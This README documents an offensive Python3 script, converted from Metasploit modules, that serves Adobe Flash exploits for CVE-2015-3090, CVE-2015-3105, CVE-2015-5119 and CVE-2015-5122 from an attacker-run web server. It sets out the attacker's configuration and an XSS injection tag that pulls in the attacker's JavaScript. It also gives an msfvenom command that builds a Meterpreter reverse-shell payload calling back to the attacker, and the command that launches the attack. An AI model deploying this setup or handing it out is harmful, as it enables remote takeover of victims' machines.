# Adobe Flash Exploits CVE-2015-3090, CVE-2015-3105, CVE-2015-5119, and CVE-2015-5122 Python3 Script
Converted Metasploit exploits for Adobe Flash vulnerabilities CVE-2015-3090, CVE-2015-3105, CVE-2015-5119, and CVE-2015-5122 to a Python3 script.

## Information

This script will host a web server that can exploit one of the following Adobe Flash vulnerabilities at a time:

1. CVE-2015-3090
2. CVE-2015-3105
3. CVE-2015-5119
4. CVE-2015-5122

## Execute

You must make changes ([outlined here](#modifications)) to [exploit.py](exploit.py) to suit your needs.

### Modifications

- `hostname = "192.168.1.100"`
  - This is an IP on the attacking system that will host the exploit web server.
- `serverPort = 8080`
  - This is the port on the attacking system that will host the exploit web server.
- `xss = False`
  - If set to `True`, then the victim's first request to the server is treated as JavaScript:
    - Example XSS Inject:
      - `<script src="http://192.168.1.100:8080/"></script>`
    - Attack path:
      - Victim request 1 -> XSS vulnerable server:
        - Victim accesses XSS inject on a remote server that requests a JavaScript file (see request 2).
      - Victim request 2 -> JavaScript source on attacking system.
      - Victim request 3 -> Malicious swf file.
  - If set to `False`, then the victim's first request to the server is treated as HTML:
    - Example:
      - `http://192.168.1.100:8080/`
    - Attack path:
      - Victim request 1 -> HTML file on attacking system.
      - Victim request 2 -> Malicious swf file.
- `base64Payload = "..."`
  - This is the base64 payload that will be executed on the victim system.
  - Modify the example command below to suit your needs and generate your payload:
    - Example:
      - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 | base64`
    - > Note: The only payload that has worked for me is `windows/meterpreter/reverse_tcp`.
- `swfFile = swfFileList['37368']`
  - Select the Adobe Flash exploit swf file to use for exploiting the victim system:
    - ```
      swfFileList = {
          '37368': 'CVE-2015-3090.swf',
          '37448': 'CVE-2015-3105.swf',
          '37523': 'CVE-2015-5119.swf',
          '37599': 'CVE-2015-5122.swf'
      }
      ```

### Run

Run the following command, in the same directory as the malicious swf files, to execute the Adobe Flash exploit script:

- `python3 exploit.py`
